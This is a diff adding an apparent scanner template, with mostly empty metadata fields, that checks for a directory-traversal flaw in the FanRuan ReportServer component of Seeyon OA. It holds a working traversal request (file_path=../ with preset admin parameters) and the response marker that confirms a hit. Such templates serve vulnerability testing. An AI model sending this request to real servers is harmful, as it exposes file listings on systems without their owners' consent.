@@ -1,0 +1,19 @@
+id:
+
+info:
+  name: 致远OA 帆软组件 ReportServer 目录遍历漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true
+  headers:
+  data:
+response1:
+  headers:
+  body: envPath
+  code: 200
+requests2:
+response2:
